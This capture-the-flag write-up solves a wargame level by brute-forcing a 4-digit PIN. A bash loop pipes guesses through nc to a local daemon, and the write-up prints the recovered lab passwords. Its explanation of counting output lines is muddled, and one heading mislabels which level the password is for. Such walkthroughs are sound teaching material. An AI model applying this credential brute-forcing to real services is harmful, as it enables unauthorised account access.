# Level 25

## Level Info

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

# Solution

We need to check all possible combinations. If we provide the password for bandit24 and the PIN as instructed, one of them will give us the password for bandit25.

**Important:** We can inject strings directly into the connection:

```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234" | nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```

To do this, we can generate all possible combinations and pipe the output into the connection:

```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ for pin in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc 127.0.0.1 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```

In this way, we create a `for` loop that generates an `echo` command for all combinations between 0000 and 9999. The generated `echo` is piped into the connection. When the combination is incorrect, it returns the message: *"Wrong! Please enter the correct current password and pincode. Try again."* We apply a `grep -v` to exclude lines containing the word *"Wrong."*

If we want to identify the correct PIN, we can analyze the lines of output. Knowing that the lines we want are those marked as "Wrong," we can count those lines while excluding only the correct ones:

```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ for pin in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc 127.0.0.1 30002 | grep -vE "bandit25|Correct" | wc -l
3948
```

**Note:** The output generates an empty line at the end, which is also counted. Therefore, the correct count would be **3948 - 1 = 3947.**

# Password for level 26:

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
